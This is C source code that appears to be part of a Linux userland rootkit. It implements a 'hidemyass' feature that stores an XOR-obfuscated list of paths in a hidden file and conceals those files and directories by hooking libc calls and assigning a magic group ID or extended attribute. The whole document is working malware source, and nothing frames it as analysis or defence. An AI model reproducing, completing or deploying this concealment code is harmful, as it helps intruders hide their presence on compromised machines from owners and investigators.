int __attribute((visibility("hidden"))) getpathpos(char hide_paths[MAX_HIDE_PATHS][PATH_MAX], const char *path){
    int got = -1;
    for(int i = 0; i < MAX_HIDE_PATHS && got < 0; i++)
        got = strcmp(hide_paths[i], path) == 0 ? i : -1;
    return got;
}
#define findnewpathpos(H) getpathpos(H,"\0")

#define xorhidepaths(H) do { \
    if(H->path_count == 0) break; \
    for(size_t i = 0; i < H->path_count; i++) \
        xor(H->hide_paths[i]); \
} while(0)

#define shifthidepaths(H) do { \
    char buf[MAX_HIDE_PATHS][PATH_MAX]; \
    size_t count = 0; \
    for(size_t i = 0; i < MAX_HIDE_PATHS; i++){ \
        if(*H->hide_paths[i] == '\0') continue; \
        memset(buf[count], 0, PATH_MAX); \
        strncpy(buf[count++], H->hide_paths[i], PATH_MAX-1); \
        memset(H->hide_paths[i], 0, PATH_MAX); \
    } \
    for(size_t i = 0; i < count; i++) \
        strncpy(H->hide_paths[i], buf[i], PATH_MAX-1); \
} while(0)

size_t __attribute((visibility("hidden"))) writemyass(const char *path, const bdvhidepaths_t *hp){
    hook(CFOPEN, CFWRITE);

    FILE *fp = call(CFOPEN, path, "wb");
    if(!fp) return 0;

    size_t rv = (size_t)call(CFWRITE, hp, 1, sizeof(bdvhidepaths_t), fp);
    if(!ferror(fp)) fflush(fp);
    fclose(fp);
    return rv;
}

bdvhidepaths_t *readass(const bdvcfg_t *bc){
    hook(CFOPEN);
    FILE *fp = call(CFOPEN, bc->asspath, "rb");
    if(!fp) return NULL;

    bdvhidepaths_t *ret = calloc(1, sizeof(bdvhidepaths_t));
    if(!ret){
        fclose(fp);
        return NULL;
    }

    hook(CFREAD);
    call(CFREAD, ret, 1, sizeof(bdvhidepaths_t), fp);
    if(ferror(fp)){
        fclose(fp);
        free(ret);
        return NULL;
    }

    xorhidepaths(ret);
    fclose(fp);
    return ret;
}

void _hidemyass(const bdvhidepaths_t *my, const bdvcfg_t *bc){
    if(my->path_count == 0) return;
    for(size_t i = 0; i < my->path_count; i++){
        const char *path = my->hide_paths[i];
        const size_t pathlen = strlen(path);
        if(pathlen == 0) continue;
        if(path[pathlen-1] == '/'){
            hidedircontents(path, bc);
            continue;
        }
#ifdef USE_MAGIC_ATTR
        attrmodif(path, CSETXATTR);
#else
        chownpath(path, bc->magicid);
#endif
    }
}

void __attribute((visibility("hidden"))) options_myass(const char *a0, const char *a1, const char *maopt, const int optmode){
    if(maopt == NULL){
        bxprintlist(ass_usage_message);
        optusgndie(a0, a1, validmaopts, 16);
    }
    switch(optmode){
        case MAOPTS_RM:
        case MAOPTS_ADD:
            bxprintf(ADD_NEW_ITEM_STRING, a0, a1, maopt);
            break;
        case MAOPTS_CHANGE:
            bxprintf(CHANGE_ITEM_STRING, a0, a1, maopt);
            break;
        default:
            options_myass(a0, a1, NULL, -1);
    }
    exit(0);
}

void domyass(char *const argv[]){
    if(!reinitmvbc()) return;

    bdvhidepaths_t *my = readass(mvbc);
    if(!my){
        xperror(READASS);
        return;
    }

    const char *maopt;
    int mode;
    if(!(maopt = argv[2]) || (mode = getoptmode(maopt, validmaopts)) < 0){
        hree(my);
        options_myass(argv[0], argv[1], NULL, -1);
    }

    switch(mode){
        char *newpath, *oldpath;
        int pos;
        case MAOPTS_SHOW:
            if(my->path_count == 0){
                bxprintf(NO_PATHS_HIDEPATHS, 0);
                break;
            }
            for(u_int i = 0; i < my->path_count; i++)
                bxprintf(HIDEPATHS_PRINT_FMT, i+1, my->hide_paths[i]);
            break;
        case MAOPTS_CHANGE:
            !(oldpath = argv[3]) || !(newpath = argv[4]) ? options_myass(argv[0], argv[1], maopt, mode) : 0;
            if(my->path_count == 0){
                bxprintf(NO_PATHS_HIDEPATHS, 0);
                break;
            }
            if((pos = getpathpos(my->hide_paths, oldpath)) < 0){
                bxprintf(FAILED_LOCATING_PATH, 0);
                break;
            }
            strncpy(my->hide_paths[pos], newpath, PATH_MAX-1);
            _hidemyass(my, mvbc);
            xorhidepaths(my);
            if(writemyass(mvbc->asspath, my) > 0)
                bxprintf(SUCCESS_STRING, 0);
            else xperror(WRITEMYASS);
            break;
        case MAOPTS_ADD:
            !(newpath = argv[3]) ? options_myass(argv[0], argv[1], maopt, mode) : 0;
            if(my->path_count == MAX_HIDE_PATHS){
                bxprintf(HIDEPATHS_CAP_REACHED, 0);
                break;
            }
            for(size_t i = 0; i < my->path_count; i++){
                if(strcmp(my->hide_paths[i], newpath) == 0){
                    bxprintf(HIDEPATH_ALREADY_ADDED, newpath);
                    break;
                }
            }
            if((pos = findnewpathpos(my->hide_paths)) < 0){
                bxprintf(FAILED_FREE_SPACE, 0);
                break;
            }
            strncpy(my->hide_paths[pos], newpath, PATH_MAX-1);
            ++my->path_count;
            _hidemyass(my, mvbc);
            xorhidepaths(my);
            if(writemyass(mvbc->asspath, my) > 0)
                bxprintf(SUCCESS_STRING, 0);
            else xperror(WRITEMYASS);
            break;
        case MAOPTS_RM:
            !(oldpath = argv[3]) ? options_myass(argv[0], argv[1], maopt, mode) : 0;
            if(my->path_count == 0){
                bxprintf(NO_PATHS_HIDEPATHS, 0);
                break;
            }
            if((pos = getpathpos(my->hide_paths, oldpath)) < 0){
                bxprintf(FAILED_LOCATING_PATH, 0);
                break;
            }
            memset(my->hide_paths[pos], 0, PATH_MAX);
            --my->path_count;
            shifthidepaths(my);
            xorhidepaths(my);
            if(writemyass(mvbc->asspath, my) > 0)
                bxprintf(SUCCESS_STRING, 0);
            else xperror(WRITEMYASS);
            break;
    }

    hree(my);
}